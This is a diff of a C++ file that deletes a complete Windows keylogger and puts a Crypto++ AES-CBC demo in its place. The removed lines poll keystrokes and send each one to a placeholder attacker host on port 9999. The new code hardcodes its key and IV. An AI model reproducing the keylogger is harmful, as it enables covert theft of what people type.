@@ -1,49 +1,61 @@
-#include <winsock2.h>
-#include <windows.h>
 #include <iostream>
+#include <string>
+#include <cryptopp/aes.h>
+#include <cryptopp/filters.h>
+#include <cryptopp/hex.h>
+#include <cryptopp/modes.h>
 
-void logKey(int key, SOCKET sock) {
-    char buffer[2];
-    buffer[0] = (char)key;
-    buffer[1] = '\0';
+using namespace CryptoPP;
 
-    send(sock, buffer, 1, 0);
+std::string EncryptString(const std::string& plain, const std::string& key, const std::string& iv) {
+    std::string cipher;
+
+    try {
+        AES::Encryption aesEncryption((byte *)key.c_str(), AES::DEFAULT_KEYLENGTH);
+        CBC_Mode_ExternalCipher::Encryption cbcEncryption(aesEncryption, (byte *)iv.c_str());
+
+        StreamTransformationFilter stfEncryptor(cbcEncryption, new StringSink(cipher));
+        stfEncryptor.Put(reinterpret_cast<const unsigned char*>(plain.c_str()), plain.length() + 1);
+        stfEncryptor.MessageEnd();
+    }
+    catch (const Exception& e) {
+        std::cerr << e.what() << std::endl;
+        exit(1);
+    }
+
+    return cipher;
 }
 
-int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
-    WSADATA wsaData;
-    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
-        return 1;
+std::string DecryptString(const std::string& cipher, const std::string& key, const std::string& iv) {
+    std::string recovered;
+
+    try {
+        AES::Decryption aesDecryption((byte *)key.c_str(), AES::DEFAULT_KEYLENGTH);
+        CBC_Mode_ExternalCipher::Decryption cbcDecryption(aesDecryption, (byte *)iv.c_str());
+
+        StreamTransformationFilter stfDecryptor(cbcDecryption, new StringSink(recovered));
+        stfDecryptor.Put(reinterpret_cast<const unsigned char*>(cipher.c_str()), cipher.size());
+        stfDecryptor.MessageEnd();
+    }
+    catch (const Exception& e) {
+        std::cerr << e.what() << std::endl;
+        exit(1);
     }
 
-    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-    if (sock == INVALID_SOCKET) {
-        WSACleanup();
-        return 1;
-    }
+    return recovered;
+}
 
-    sockaddr_in server;
-    server.sin_family = AF_INET;
-    server.sin_addr.s_addr = inet_addr("REPLACE_WITH_LHOST");
-    server.sin_port = htons(9999);
+int main() {
+    std::string key = "0123456789abcdef"; // 16 bytes for AES128
+    std::string iv = "abcdef9876543210"; // AES block size in bytes
 
-    if (connect(sock, (sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
-        closesocket(sock);
-        WSACleanup();
-        return 1;
-    }
+    std::string plain = "This is a test";
+    std::string cipher = EncryptString(plain, key, iv);
+    std::string decoded = DecryptString(cipher, key, iv);
 
-    while (true) {
-        for (int key = 8; key <= 190; key++) {
-            if (GetAsyncKeyState(key) == -32767) {
-                logKey(key, sock);
-            }
-        }
-        Sleep(10);
-    }
-
-    closesocket(sock);
-    WSACleanup();
+    std::cout << "Cipher (Hex): ";
+    StringSource ss1(cipher, true, new HexEncoder(new FileSink(std::cout)));
+    std::cout << std::endl << "Decoded: " << decoded << std::endl;
 
     return 0;
 }
